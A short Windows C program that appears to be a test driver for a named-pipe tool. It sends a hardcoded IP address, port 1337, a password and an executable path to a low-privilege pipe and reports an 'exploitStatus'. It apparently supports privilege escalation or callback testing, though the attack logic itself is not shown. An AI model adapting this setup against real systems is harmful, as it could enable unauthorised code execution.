#include <windows.h> 
#include <stdio.h>

#include "PipeServer.h"


int main(VOID){
    PipeDataStruct pipeDataStruct = {
        .ipAddress = "192.168.100.135",
        .port = 1337,
        .exploitStatus = FALSE,
        .pathExeToRun = "TestPipeServerHigh.exe"
    };
    const char* lpszPipename = "\\\\.\\pipe\\mynamedpipeLow";
    const char* password = "ekttKwf3PFzRCc9egZ5AKfd8FKvGjRu3DrHCTdwT5YKCk2dm9rSxByFzFNKb";


    SendInfoPipe(&pipeDataStruct, lpszPipename, password);

    printf("[-] Result:\n");
    printf("\t[+] Status: %i\n", pipeDataStruct.exploitStatus);

    return 0;
}